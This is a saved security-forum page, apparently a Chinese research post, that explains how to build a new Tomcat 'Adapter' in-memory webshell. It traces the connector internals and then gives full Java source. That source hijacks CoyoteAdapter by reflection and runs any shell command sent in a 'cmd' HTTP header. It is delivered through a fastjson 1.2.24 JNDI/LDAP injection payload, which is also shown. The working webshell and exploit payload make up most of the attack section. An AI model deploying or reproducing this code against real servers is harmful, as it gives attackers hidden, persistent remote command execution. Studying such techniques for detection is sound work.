@@ -1,0 +1,1154 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>连接器中内存马的构造-Adapter内存马 - 先知社区</title>
+    <meta name="description" content="先知社区，先知安全技术社区">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <link rel="icon" href="/static/icon/favicon.ico" type="image/x-icon">
+    <link href="/static/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="/static/editor.md/css/editormd.min.css">
+    <link rel="stylesheet" href="/static/css/bbs/tango.css">
+    <link href="/static/css/bootstrap-responsive.min.css" rel="stylesheet">
+    <!-- Le styles -->
+    <link rel="stylesheet" href="/static/css/OverlayStyle.css">
+    <link rel="stylesheet" href="/static/css/topic.css">
+    <link rel="stylesheet" href="/static/css/beautify.css">
+    
+    <link rel="stylesheet" href="/static/editor.md/css/editormd.css">
+    <link rel="stylesheet" href="/static/css/bbs/tango.css">
+    <link rel="stylesheet" href="/static/plugins/fancybox/jquery.fancybox.min.css">
+
+    <script src="//aeu.alicdn.com/waf/jquery_221121.min.js"></script><script src="//aeu.alicdn.com/waf/antidomxss_v702.js"></script><script src="//aeu.alicdn.com/waf/interfaceacting230515.js"></script><!--[if lte IE 8]>
+        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
+    <![endif]-->
+    
+    
+
+    <!--[if !IE]> -->
+    <script type="text/javascript" src="/static/js/jquery-2.1.3.min.js"></script>
+    
+    
+    <script src="/static/plugins/fancybox/jquery.fancybox.min.js"></script>
+
+    <!-- <![endif]-->
+</head>
+<body>
+<!-- navbar begin -->
+<div class="navbar navbar-default">
+    <div class="navbar-inner">
+        <div class="container" style="text-align: center; position:relative;">
+            <!--[if lte IE 8]>
+            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
+            <![endif]-->
+            <div class="brand-box">
+                <a class="brand" href="/tab/1"></a>
+            </div>
+            
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F14157%3Fu_atoken%3D487232ca76b4b948e7049e9a9ae10da8%26u_asig%3D1a0c380817290453544346912e0048&amp;from_type=xianzhi" class="pull-right anonymous-user hh_loding">
+                    登录</a>
+            
+            <div class="nav-collapse collapse">
+                <div class="search d1 text-right">
+                    <form method="get" action="/search">
+                        <input type="text" placeholder="搜索" name="keyword"  >
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- navbar end -->
+<!-- main content begin -->
+<div id="Wrapper" class="container">
+    
+    
+    <div class="row2">
+        <div class="span10">
+            
+    
+
+
+
+    <script src="/static/plugins/toc/jquery.toc.min.js"></script>
+    <script src="/static/plugins/toc/toc.min.js"></script>
+    <script src="/static/js/dt.js"></script>
+    
+
+
+<div class="row box content">
+    
+    <div class="box-container">
+        <div class="main-topic">
+            <div class="clearfix user-info topic-list">
+                <p><span
+                        class="content-title ">连接器中内存马的构造-Adapter内存马</span>
+                </p>
+                <div class="topic-info">
+                <span class="info-left">
+                    <a href="/u/81008">
+                        <span class="username cell"> lzstar</span></a> <span
+                        class="i-seprator"> / </span>
+                    <span> 2024-03-22 18:00:34</span><span
+                        class="i-seprator"> / </span>
+                    
+                        <span>发表于北京 / </span>
+                    
+                    <span>浏览数 1614</span>
+                    
+                    
+                    <span class="content-node">
+                    
+                        <span class="label label-default label-node-first">
+                            <a href="/tab/1">技术文章</a></span>
+                        <span class="label label-default">
+                            <a href="/node/11">技术文章</a></span>
+                    
+                    </span>
+                </span>
+                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(14157);">
+             顶(1)</a>
+             <a class="vote vote-down" href="javascript:" onclick="voteDown(14157);">
+             踩(0)</a></span>
+                </div>
+            </div>
+            <hr>
+            <div id="topic_content" class="topic-content markdown-body">
+                <h2>0x 00 前言</h2>
+<p>自从bluE0大佬提出executor内存马已经过去了快两年，Google一下，发现只有RoboTerh大佬构造过Upgrade内存马。</p>
+<p>明显连接器这个地方还有很多地方可以构造内存马。</p>
+<p>网上讲内存马的文章不少，但告诉大家如何构造内存马的文章很少。</p>
+<p>所以就有了这篇文章。</p>
+<p>我认为要构造一个从没有人提过的内存马，需要对源码有一定了解，所以本文从tomcat连接器源码开始调试，</p>
+<p>之后以我构造Adapter内存马的过程开始，详细讲述的内存马如何构造。</p>
+<h2>0x 01 tomcat连接器源码调试</h2>
+<p>为了搭建环境的方便，我直接使用的spring内置的tomcat</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175120-bc5ff0b6-e831-1.png"></p>
+<p>从TomcatWebServer的start方法开始应该就是tomcat相关的逻辑了</p>
+<p>由于是要从连接器中寻找能构造内存马的组件，那么我们重点看看连接器的部分</p>
+<p>直接来到org.apache.tomcat.util.net.NioEndpoint#public void startInternal() throws Exception</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175130-c2228658-e831-1.png"></p>
+<h3>Acceptor</h3>
+<p>先从Acceptor启动的线程开始，看看做了什么工作，来到org.apache.tomcat.util.net.Acceptor#public void run() {</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175141-c8b23a86-e831-1.png"></p>
+<p>该方法代码接着往下看，会发现其会将accept方法返回的Channel对象交给Poller处理</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175149-cd4d2c0e-e831-1.png"></p>
+<h3>Poller</h3>
+<p>之后会将Channel对象放入PollerEvent中</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175158-d33aa542-e831-1.png"></p>
+<p>最后将PollerEvent添加到Poller维护的队列中</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175215-dd445682-e831-1.png"></p>
+<p>Poller这边线程开启同样也是一个死循环，这个线程会调用events方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175227-e42ddb26-e831-1.png"></p>
+<p>这个events方法会将我们刚刚放入队列中的PollerEvent取出，并从PollerEvent的属性中取出NioSocketWrapper，把NioSocketWrapper注册到Poller线程中的Selector中。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175234-e85122ee-e831-1.png"></p>
+<p>我们看看Poller的run方法后半，</p>
+<p>遍历已经就绪的SelectorKey集合，从SelectionKey中取出NioSocketWrapper，然后分发处理所有活跃的事件。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175322-05088738-e832-1.png"></p>
+<p>这个事件怎么处理的呢，生成一个 SocketProcessor 任务对象交给 Executor 去处理。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175329-0936c9c8-e832-1.png"></p>
+<h3>Executor</h3>
+<p>处理的Executor 实质就是ThreadPoolExecutor， bluE0大佬的executor内存马就是基于替换这个ThreadPoolExecutor而实现的</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175343-11ab4e26-e832-1.png"></p>
+<p>之后就是ThreadPoolExecutor会调用SocketProcessor 的run方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175350-15c7a612-e832-1.png"></p>
+<h3>Http11Processor</h3>
+<p>这个run方法经过层层调用，最终会调用Http11Processor（默认）来读取和解析请求数据</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175357-19fd5736-e832-1.png"></p>
+<p>再经过层层调用，会到Http11Processor的service方法，这个service方法中有一个需要注意的，</p>
+<p>如果请求头存在有upgrade标识，则会走Upgrade协议的逻辑。RoboTerh大佬 就是将自定义的UpgradeProtocol添加到AbstractHttp11Protocol中，达到注入UpgradeProtocol马的目的。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175428-2c3b1d70-e832-1.png"></p>
+<h3>Adapter</h3>
+<p>如果不走这个协议，则会调用适配器的service方法，默认调用的是CoyoteAdapter的service方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175435-30c5dfec-e832-1.png"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175442-346de43c-e832-1.png"></p>
+<p>再后面就到容器的逻辑了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175454-3c21ce96-e832-1.png"></p>
+<h2>0x 02 连接器内存马构造</h2>
+<p>从连接器到容器的整个过程中，所有涉及的组件都有可能构造内存马</p>
+<p>这里以构造Adapter内存马为例</p>
+<ol>
+<li>寻找请求调用栈上的Adapter实现类，并找到其调用的方法</li>
+<li>寻找存储有Adapter实现类的字段</li>
+<li>构造Adapter内存马</li>
+<li>验证Adapter内存马</li>
+</ol>
+<h3>寻找请求调用栈上的Adapter实现类</h3>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175503-4106a418-e832-1.png"></p>
+<p>由上图可以看到，一个请求再到controller的过程中，会经过CoyoteAdapter的service方法</p>
+<p>调用栈往前看，看看这个CoyoteAdapter是存储在那个对象里面的，可以看到CoyoteAdapter就是Http11Processor的adapter</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175508-446718f4-e832-1.png"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240322175513-47673052-e832-1.png"></p>
+<p>也就是后续需要在全局变量中找到Http11Processor</p>
+<h3>寻找存储CoyoteAdapter实现类的字段</h3>
+<p>这里借用conly大佬的java内存对象搜索辅助工具寻找</p>
+
+<pre><code>//设置搜索类型包含Request关键字的对象
+        List&lt;Keyword&gt; keys = new ArrayList&lt;&gt;();
+        keys.add(new Keyword.Builder().setField_type("Http11Processor").build());
+        //定义黑名单
+        List&lt;Blacklist&gt; blacklists = new ArrayList&lt;&gt;();
+        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
+        //新建一个广度优先搜索Thread.currentThread()的搜索器
+//        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
+        SearchRequstByBFS searcher = new SearchRequstByBFS(o,keys);
+         // 设置黑名单
+        searcher.setBlacklists(blacklists);
+         //打开调试模式,会生成log日志
+        searcher.setIs_debug(true);
+        //挖掘深度为20
+        searcher.setMax_search_depth(30);
+         //设置报告保存位置
+        searcher.setReport_save_path("E:\\xxx\\log");
+        searcher.searchObject();</code></pre>
+<p>将该段代码封装为一个方法</p>
+<p>之后直接放到controller方法中寻找</p>
+
+<pre><code>@RequestMapping("/hello")
+    public String hello()  {
+        test1.testSearchRequest();
+        return "hello world!";
+    }</code></pre>
+<p>可以找到以下符合要求的路径</p>
+
+<pre><code>TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
+  ---&gt; group = {java.lang.ThreadGroup} 
+   ---&gt; threads = {class [Ljava.lang.Thread;} 
+    ---&gt; [15] = {java.lang.Thread} 
+     ---&gt; target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
+      ---&gt; this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
+       ---&gt; connections = {java.util.Map&lt;U, org.apache.tomcat.util.net.SocketWrapperBase&lt;S&gt;&gt;} 
+        ---&gt; [java.nio.channels.SocketChannel[connected local=/127.0.0.1:8081 remote=/127.0.0.1:53770]] = {org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper} 
+         ---&gt; currentProcessor = {org.apache.coyote.http11.Http11Processor}</code></pre>
+<p>由于该工具原理就是从内存中，搜索某个变量的属性，是否有符合要求的</p>
+<p>基于以下考虑，限制了深度</p>
+<ul>
+<li>第一个是这样反射路径过长，就算是搜索到了，最终构造的payload数据会很大</li>
+<li>第二个是挖掘时间会很长，因为JVM虚拟机内存中的对象结构其实是非常的复杂的，一个对象的属性往往嵌套着另一个对象，另一个对象的属性继续嵌套其他对象…</li>
+</ul>
+<p>深度优先可能会错过比较短的反射链，所以建议深度优先和广度优先结合着来</p>
+<p>基于前面源码调试，可以发现，连接器里面的东西，很多都能从NioEndpoint中获取，所以其实实在搜不到，也可以分两步进行</p>
+<p>第一步是搜NioEndpoint对象</p>
+<p>第二步是从NioEndpoint对象中搜索需要的对象</p>
+<p>不一定要从全局变量中找，只要是存储有我们需要信息的对象，并且我们能够获取到就能满足要求</p>
+<h3>构造Adapter内存马</h3>
+<p>由于请求调用栈上调用的是CoyoteAdapter的service方法，所以我们需要重写其service方法。</p>
+<p>但它service方法代码太多了，直接cv会导致内存马太大，不过可以直接用super.service(req, res);进行调用父类的</p>
+<p>最终构造如下</p>
+
+<pre><code>@Override
+    public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception {
+        System.out.println("success !");
+        String p = req.getHeader("cmd");
+        if(null!=p){
+            exec(p, res);
+        }else {
+            //调用父类service方法
+            super.service(req, res);
+        }
+
+    }</code></pre>
+<p>执行命令的方法如下</p>
+
+<pre><code>public void exec(String p, org.apache.coyote.Response res) {
+        try {
+            String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
+            byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
+            res.doWrite(ByteBuffer.wrap(result));
+        } catch (Exception e) {
+        }
+    }</code></pre>
+<p>之前找到CoyoteAdapter存储在Http11Processor中</p>
+<p>之后通过conlyone大佬的内存对象搜索工具找到如何从当前线程获取Http11Processor</p>
+
+<pre><code>TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
+  ---&gt; group = {java.lang.ThreadGroup} 
+   ---&gt; threads = {class [Ljava.lang.Thread;} 
+    ---&gt; [15] = {java.lang.Thread} 
+     ---&gt; target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
+      ---&gt; this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
+       ---&gt; connections = {java.util.Map&lt;U, org.apache.tomcat.util.net.SocketWrapperBase&lt;S&gt;&gt;} 
+        ---&gt; [java.nio.channels.SocketChannel[connected local=/127.0.0.1:8081 remote=/127.0.0.1:53770]] = {org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper} 
+         ---&gt; currentProcessor = {org.apache.coyote.http11.Http11Processor}</code></pre>
+<p>所以可以写出如下获取内存中Http11Processor的方法</p>
+
+<pre><code>public static Object getHttp11Processor() {
+        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
+        Thread threads[] = (Thread[]) getField(threadGroup, threadGroup.getClass(), "threads");
+        for(Thread thread:threads){
+            //不同的环境下可能需要在不同的线程数组元素中取出，所以使用for循环遍历这些线程
+            Object o=getField(thread, thread.getClass(), "target");
+            if(null!=o&amp;&amp;o instanceof  NioEndpoint.Poller){
+                NioEndpoint.Poller target=( NioEndpoint.Poller)o;
+                NioEndpoint nioEndpoint = (NioEndpoint) getField(target, target.getClass(), "this$0");
+                Set&lt;SocketWrapperBase&lt;NioChannel&gt;&gt; connections = nioEndpoint.getConnections();
+                for (SocketWrapperBase&lt;NioChannel&gt; c : connections) {
+                    Object currentProcessor = c.getCurrentProcessor();
+                    if (null != currentProcessor) {
+                        return currentProcessor;
+                    }
+                }
+            }
+
+        }
+        return new Object();
+    }</code></pre>
+<p>之后将Http11Processor中CoyoteAdapter替换为我们内存马的逻辑</p>
+
+<pre><code>static {
+        Http11Processor http11Processor = (Http11Processor) getHttp11Processor();
+        CoyoteAdapter adapter = (CoyoteAdapter) http11Processor.getAdapter();
+        Connector connector = (Connector) getField(adapter, adapter.getClass(), "connector");
+        MyAdapter adapterMem = new MyAdapter(connector);
+        setFiled(http11Processor, http11Processor.getClass().getSuperclass(), "adapter", adapterMem);
+    }</code></pre>
+<p>我的Adapter内存马完整构造如下</p>
+
+<pre><code>import org.apache.catalina.connector.Connector;
+import org.apache.catalina.connector.CoyoteAdapter;
+import org.apache.coyote.http11.Http11Processor;
+import org.apache.tomcat.util.net.NioChannel;
+import org.apache.tomcat.util.net.NioEndpoint;
+import org.apache.tomcat.util.net.SocketWrapperBase;
+import java.lang.reflect.Field;
+import java.nio.ByteBuffer;
+import java.util.Set;
+
+
+public class MyAdapter extends CoyoteAdapter {
+
+    static {
+        Http11Processor http11Processor = (Http11Processor) getHttp11Processor();
+        CoyoteAdapter adapter = (CoyoteAdapter) http11Processor.getAdapter();
+        Connector connector = (Connector) getField(adapter, adapter.getClass(), "connector");
+        MyAdapter adapterMem = new MyAdapter(connector);
+        setFiled(http11Processor, http11Processor.getClass().getSuperclass(), "adapter", adapterMem);
+    }
+
+    public static Object getField(Object object, Class clazz, String fieldName) {
+        Field declaredField;
+        try {
+            declaredField = clazz.getDeclaredField(fieldName);
+            declaredField.setAccessible(true);
+            return declaredField.get(object);
+        } catch (NoSuchFieldException e) {
+        } catch (IllegalAccessException e) {
+        }
+        return null;
+    }
+
+    public static void setFiled(Object object, Class clazz, String filed_Name, Object value) {
+        Field flied = null;
+        try {
+            flied = clazz.getDeclaredField(filed_Name);
+            flied.setAccessible(true);
+            flied.set(object, value);
+        } catch (NoSuchFieldException e) {
+            throw new RuntimeException(e);
+        } catch (IllegalAccessException e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    public static Object getHttp11Processor() {
+        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
+        Thread threads[] = (Thread[]) getField(threadGroup, threadGroup.getClass(), "threads");
+        for(Thread thread:threads){
+            //不同的环境下可能需要在不同的线程数组元素中取出，所以使用for循环遍历这些线程
+            Object o=getField(thread, thread.getClass(), "target");
+            if(null!=o&amp;&amp;o instanceof  NioEndpoint.Poller){
+                NioEndpoint.Poller target=( NioEndpoint.Poller)o;
+                NioEndpoint nioEndpoint = (NioEndpoint) getField(target, target.getClass(), "this$0");
+                Set&lt;SocketWrapperBase&lt;NioChannel&gt;&gt; connections = nioEndpoint.getConnections();
+                for (SocketWrapperBase&lt;NioChannel&gt; c : connections) {
+                    Object currentProcessor = c.getCurrentProcessor();
+                    if (null != currentProcessor) {
+                        return currentProcessor;
+                    }
+                }
+            }
+
+        }
+        return new Object();
+    }
+
+
+    public MyAdapter(Connector connector) {
+        super(connector);
+    }
+
+    public void exec(String p, org.apache.coyote.Response res) {
+        try {
+            String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
+            byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
+            res.doWrite(ByteBuffer.wrap(result));
+        } catch (Exception e) {
+        }
+    }
+
+
+    @Override
+    public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception {
+        System.out.println("success !");
+        String p = req.getHeader("cmd");
+        if(null!=p){
+            exec(p, res);
+        }else {
+            //调用父类service方法
+            super.service(req, res);
+        }
+
+    }
+}</code></pre>
+<h3>验证Adapter内存马</h3>
+<p>将该马加入jndi测试工具，</p>
+<p>测试环境为  fastjson1.2.24，jdk8</p>
+<p>打入以下payload</p>
+
+<pre><code>{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/0/MyAdapter/123","autoCommit":true}</code></pre>
+<p>jndi测试工具会返回指向MyAdapter内存马的reference</p>
+<p>之后受害服务器远程通过reference远程加载构造的Adapter马</p>
+<p>执行器静态代码块中的逻辑，将内存中的CoyoteAdapter替换为我们的Adapter马</p>
+<p>之后发送任意路径下的请求，都会到我们Adapter马的service方法，如果请求头中带有cmd，则会执行命令并将结果返回</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240326163026-18d54492-eb4b-1.png"></p>
+<p>至此，一个没有被大家提出过的内存马就构造出来了，根据tomcat连接器处的源码调试可知，一个请求从接收到controller，在连接器中经过了好几个组件均有可能构造出内存马。</p>
+<p>当然也有可能会有一些分支情况，比如Upgrade内存马，如果请求头存在有upgrade标识，则会走Upgrade协议的逻辑。</p>
+<h2>0x 03 写后感</h2>
+<p>本文作者才疏学浅，文章若有错误或可优化之处，还麻烦各位大佬指点一二。</p>
+<p><strong>参考链接：</strong></p>
+<p>tomcat源码解读</p>
+<ol>
+<li><a href="https://blog.csdn.net/weixin_45505313/article/details/118631533" target="_blank">https://blog.csdn.net/weixin_45505313/article/details/118631533</a></li>
+<li><a href="https://server.51cto.com/article/689817.html" target="_blank">https://server.51cto.com/article/689817.html</a></li>
+<li><a href="https://blog.csdn.net/qq_32868023/article/details/127836784" target="_blank">https://blog.csdn.net/qq_32868023/article/details/127836784</a></li>
+<li><a href="https://blog.csdn.net/ldw201510803006/article/details/119790847" target="_blank">https://blog.csdn.net/ldw201510803006/article/details/119790847</a></li>
+<li><a href="https://blog.csdn.net/qq_40355167/article/details/119702153" target="_blank">https://blog.csdn.net/qq_40355167/article/details/119702153</a></li>
+</ol>
+<p>连接器内存马</p>
+<p>Executor内存马的实现：<a href="https://xz.aliyun.com/t/11593?time__1311=mqmx0DBD2QD%3D%3DBKDsKE4fWKY0KX4AK4ex" target="_blank">https://xz.aliyun.com/t/11593?time__1311=mqmx0DBD2QD%3D%3DBKDsKE4fWKY0KX4AK4ex</a></p>
+<p><a href="https://www.freebuf.com/vuls/345119.html" target="_blank">初探Upgrade内存马(内存马系列篇六) - FreeBuf网络安全行业门户</a></p>
+<p>java内存对象搜索辅助工具</p>
+<p><a href="https://github.com/c0ny1/java-object-searcher" target="_blank">https://github.com/c0ny1/java-object-searcher</a></p>
+<p>java java-object-searcher工具实现理论基础    <a href="https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/" target="_blank">https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/</a></p>
+
+            </div>
+            
+
+            <div class="post-user-action" style="margin-top: 34px;">
+                <span class="btn btn-default pull-right" id="mark" data-action="topic"
+                      data-pk="14157">
+                    <span id="mark-text">点击收藏 </span><span
+                        class="i-seprator"> | </span><span id="mark-count">3</span>
+                </span>
+                
+                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="14157">
+                     <span>关注</span><span class="i-seprator"> | </span><span
+                            id="follow-count">1</span>
+                    </span>
+                
+                
+                    <span class="btn btn-default pull-right">
+                     <span>
+                         
+                             <span id="ready_reward" data-toggle="modal" data-target="#myModal">打赏</span>
+                         
+                     </span>
+                    </span>
+                
+                <div class="clearfix"></div>
+            </div>
+            
+                <div class="related-section">
+                    <div class="related-box">
+                        
+                            <span><a class="pull-left" href="/t/14149"
+                                     title="一文说清楚MITRE ATT&amp;CK威胁框架"><span class="related-label"
+                                                                   style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>一文说清楚MITRE ATT&amp;CK...</a></span>
+                        
+                        
+                            <span><a class="pull-left" href="/t/14162"
+                                     title="蚁剑流量分析"><span class="related-label"
+                                                                    style="">下一篇：</span>蚁剑流量分析</a></span>
+                        
+                    </div>
+                </div>
+            
+        </div>
+    </div>
+</div>
+<div class="modal fade" id="myModal" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="myModalLabel" style="text-align: center">
+                    积分打赏
+                </h4>
+            </div>
+            <div class="modal-body" id="button-value">
+                <div style="text-align: center;">
+                 <div role="group">
+                    <button type="button" class="btn btn-secondary m64"
+                            style="min-width: 64px;"
+                            data-value="type1">
+                        1分
+                    </button>
+                    <button type="button" class="btn btn-secondary m64"
+                            style="min-width: 64px;" data-value="type2">
+                        2分
+                    </button>
+                    <button type="button" class="btn btn-secondary m64"
+                            style="min-width: 64px;"
+                            data-value="type3">
+                        5分
+                    </button>
+                 </div>
+                 <br>
+                 <div style="margin-top: 20px">
+                    <button type="button" class="btn btn-secondary m64"
+                            style="min-width: 64px;" data-value="type4">
+                        8分
+                    </button>
+                    <button type="button" class="btn btn-secondary m64"
+                            style="min-width: 64px;" data-value="type5">
+                        10分
+                    </button>
+                    <button type="button" class="btn btn-secondary m64"
+                            style="min-width: 64px;" data-value="type6">
+                        20分
+                    </button>
+                 </div>
+                </div>
+            </div>
+            <div class="modal-footer" id="confirm">
+                <button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>
+                <button type="button" class="btn btn-primary" id="reward_topic" data-pk="14157">确定</button>
+            </div>
+        </div>
+    </div><!-- /.modal -->
+</div>
+
+    <!-- topic & appendix -->
+    
+
+
+
+<div class="row box">
+    <ol class="breadcrumb">
+        <li class="active">2 条回复</li>
+    </ol>
+    <div class="box-container post-container">
+        
+            
+                <ul class="post-info" id="reply-19739">
+                    <li>
+                        <div class="row1 user-info clearfix">
+                            
+                                <img class="avatar pull-left tiny-avatar"
+                                     src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default"
+                                   href="/u/81008">lzstar</a>
+                                
+                                <span class="bbs-time">2024-03-27 10:31:33</span>
+                                
+                                    <span>来自北京 </span>
+                                
+                            </span>
+                            <div class="post-content markdown-body">
+                                <p>连接器原理总结<br>
+①请求首先会到LimitLatch ， LimitLatch 是 NioEndpoint 的连接控制器，用来控制最大连接数，当链接超过阈值后，线程会被阻塞。<br>
+②请求通过 LimitLatch 到达 Acceptor，Acceptor 跑在一个单独的线程里，通过在死循环里调用 accept 方法来接收新连接。<br>
+③一旦有新的连接请求到来，accept 方法返回一个 Channel 对象，接着把 Channel 对象交给 Poller 去处理。<br>
+④Poller 在内部维护了一个队列，并且会不断检测 Channel 的数据就绪状态。 一旦就绪就说明 Channel中的数据包可读，于是生成一个 SocketProcessor 任务对象交给 Executor 去处理。 ⑤Executor 线程池，负责运行 SocketProcessor 任务类，SocketProcessor 的 run 方法经过层层调用，会调用 Processor 来读取和解析请求数据。<br>
+⑥不同的协议会调用不同的process，默认调用的是Http11Processor ，当请求头存在有upgrade标识，则会走Upgrade协议的逻辑。如果没有，则会调用Adapter的service方法<br>
+⑦之后就是StandardEngineValve的逻辑了，此处讨论的是连接器，就不再继续了。</p>
+
+                            </div>
+                            <div class="manual-box">
+                                <span class="thumbs " data-action="post" data-pk="19739"
+                                      data-topic="14157"><i class="fa fa-thumbs-o-up"></i><span>0</span></span>
+                                <span class="reply-jump reply reply-count "
+                                      data-nickname="lzstar">回复Ta</span>
+                            </div>
+                        </div>
+
+                        <hr>
+                    </li>
+                </ul>
+            
+                <ul class="post-info" id="reply-20152">
+                    <li>
+                        <div class="row1 user-info clearfix">
+                            
+                                <img class="avatar pull-left tiny-avatar"
+                                     src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default"
+                                   href="/u/69074">uu2fu3o</a>
+                                
+                                <span class="bbs-time">2024-07-16 15:06:49</span>
+                                
+                                    <span>来自浙江 </span>
+                                
+                            </span>
+                            <div class="post-content markdown-body">
+                                <p>根据师傅代码调试，但最后这里获取的是null，请教一下是什么问[![123]<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240716150633-ef558902-4341-1.png"></p>
+
+                            </div>
+                            <div class="manual-box">
+                                <span class="thumbs " data-action="post" data-pk="20152"
+                                      data-topic="14157"><i class="fa fa-thumbs-o-up"></i><span>0</span></span>
+                                <span class="reply-jump reply reply-count "
+                                      data-nickname="uu2fu3o">回复Ta</span>
+                            </div>
+                        </div>
+
+                        <hr>
+                    </li>
+                </ul>
+            
+        
+    </div>
+</div>
+
+
+    <!-- posts of topic -->
+    
+        <div class="row box" id="reply-box">
+            
+            <div class="box-container clearfix">
+                
+                    <div class="reminder">
+                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F14157%3Fu_atoken%3D487232ca76b4b948e7049e9a9ae10da8%26u_asig%3D1a0c380817290453544346912e0048&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
+                    </div>
+                
+            </div>
+        </div>
+    
+    <!-- editor for post -->
+    
+
+        </div>
+        <div class="span3 pull-right offset sidebar">
+            
+
+
+    <div class="box">
+        <div class="info-panel">
+            <p><strong>先知社区</strong></p>
+            <hr>
+            <p class="text-center login-btn">
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F14157%3Fu_atoken%3D487232ca76b4b948e7049e9a9ae10da8%26u_asig%3D1a0c380817290453544346912e0048&amp;from_type=xianzhi" class="btn">现在登录</a>
+            </p>
+        </div>
+    </div>
+
+
+
+    <div class="box">
+        <div class="hot-node notice">
+            <div class="info-body">
+                <a href="/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>
+            </div>
+        </div>
+    </div>
+
+
+
+    <div class="box">
+        <div class="hot-node notice" style="padding: 6px 10px 6px 10px;">
+            <strong>最新公告：</strong>
+            <div class="info-body">
+                <a href="/t/15717" style="padding: 4px 10px 4px 10px;">
+                    先知安全沙龙 - 杭州站 10月19日开启！
+                </a>
+                <span style="float: right;">
+                    2024-09-27
+                </span>
+            </div>
+        </div>
+    </div>
+
+
+
+    <div class="box">
+        <div class="hot-node notice" style="padding: 6px 10px 6px 10px;">
+            <strong>月度热门：</strong>
+        </div>
+    <div class="info-body">
+
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname"
+                               href="/t/15811"
+                               title="小心你的加密货币，针对加密货币的窃密样本详细分析"
+                            >
+                                小心你的加密货币，针对加密货币的窃密样本详细分析
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com/media/upload/avatars/54969_ff43f4273e35764443.png"/>
+                            
